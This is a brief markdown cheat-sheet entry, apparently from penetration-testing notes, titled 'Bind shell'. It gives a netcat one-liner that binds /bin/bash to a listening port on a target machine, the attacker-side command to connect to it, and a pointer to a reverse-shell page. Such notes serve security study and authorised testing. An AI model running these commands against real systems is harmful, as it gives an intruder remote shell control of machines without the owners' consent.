# Bind shell

On target:

```bash
/bin/bash 0< /tmp/l33t | nc -lvnp <PORT> -e /bin/bash 1> /tmp/l33t
```

On host:

```bash
nc <IP> <PORT>
```

See [reverse-shell](reverse-shell.md) for upgrading.